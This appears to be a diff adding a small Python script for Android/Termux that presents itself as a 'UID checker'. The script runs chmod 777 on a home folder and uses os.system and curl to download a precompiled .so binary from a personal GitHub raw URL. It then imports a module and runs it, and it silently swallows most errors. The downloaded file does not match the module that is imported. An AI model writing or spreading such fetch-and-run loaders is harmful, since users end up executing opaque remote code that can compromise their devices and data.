@@ -1,0 +1,21 @@
+import re,os,sys
+try:
+    os.mkdir('/sdcard/QSR')
+except:
+    pass
+try:
+    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
+    if not os.path.exists("pycrypto_qsr.cpython-311.so"):
+        os.system("chmod 777 $HOME/Qsr")
+        os.system(f'curl -L {download_link} > pycrypto_qsr.cpython-311.so')
+        import Uidtester as b
+        b.uid_checker()
+    else:
+        import Uidtester as b
+        b.uid_checker()
+except PermissionError:
+    exit('Permission Error ! Found')
+except ConnectionError:
+    exit('Network Error ! Found')
+except Exception as e:
+    pass
